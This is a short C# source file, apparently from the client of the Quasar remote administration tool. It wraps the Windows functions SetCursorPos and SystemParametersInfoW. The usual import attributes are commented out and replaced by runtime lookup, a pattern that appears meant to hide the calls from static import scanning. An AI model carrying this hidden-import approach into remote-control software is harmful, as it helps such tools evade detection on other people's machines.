using Quasar.Client.Win32PE.PE;
using Quasar.Client.Win32PE.Structs;
using Quasar.Common.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Utilities
{
    /// <summary>
    /// Provides access to the Win32 API.
    /// </summary>
    internal static partial class ClientNatives
    {
        //[DllImport("user32.dll")]
        internal delegate bool SetCursorPosFunc(int x, int y);
        internal static bool SetCursorPos(int x, int y) => Lookup<SetCursorPosFunc>("user32.dll", "SetCursorPos")(x, y);

        //[DllImport("user32.dll")]
        internal delegate bool SystemParametersInfoFunc(uint uAction, uint uParam, ref IntPtr lpvParam, uint flags);
        internal static bool SystemParametersInfo(uint uAction, uint uParam, ref IntPtr lpvParam, uint flags) => Lookup<SystemParametersInfoFunc>("user32.dll", "SystemParametersInfoW")(uAction, uParam, ref lpvParam, flags);
    }
}
